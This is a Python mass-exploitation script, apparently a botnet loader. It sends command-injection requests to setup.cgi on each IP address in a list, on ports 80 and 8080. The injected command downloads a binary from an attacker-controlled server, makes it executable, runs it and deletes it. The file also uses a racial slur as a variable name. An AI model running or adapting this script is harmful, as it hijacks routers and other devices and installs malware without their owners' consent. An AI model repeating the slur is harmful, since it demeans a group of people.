#! python !#
import threading, sys, time, re, os, requests
if len(sys.argv) < 2:
    print "\033[37mUsage: python "+sys.argv[0]+" list of ips \033[37m"
    sys.exit()

serverip = "IP"  
mip = "mips" 
ips = open(sys.argv[1], "r").readlines()
class afr(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print("\033[1;33m[\033[1;33mAfrico\033[1;33m] Sending: \033[1;33m-> \033[1;33m%s") % (self.ip)
				payload = "http://" +self.ip +"/setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=wget%20http://"+serverip+"/"+mip+"%20-O%20/var/tmp/"+mip+";%20chmod%20777%20/var/tmp/"+mip+";%20/var/tmp/"+mip+";%20rm%20-rf%20/var/tmp/"+mip+"&curpath=/&currentsetting.htm=1"
				payload1 = "http://" +self.ip +":8080/setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=wget%20http://"+serverip+"/"+mip+"%20-O%20/var/tmp/"+mip+";%20chmod%20777%20/var/tmp/"+mip+";%20/var/tmp/"+mip+";%20rm%20-rf%20/var/tmp/"+mip+"&curpath=/&currentsetting.htm=1" 
				requests.get(payload, timeout=5)
				requests.get(payload1, timeout=5)
        		except:
            		    pass
 
for ip in ips:
	try:
		fuckingnigger = afr(ip)
		fuckingnigger.start()
	except:
		pass
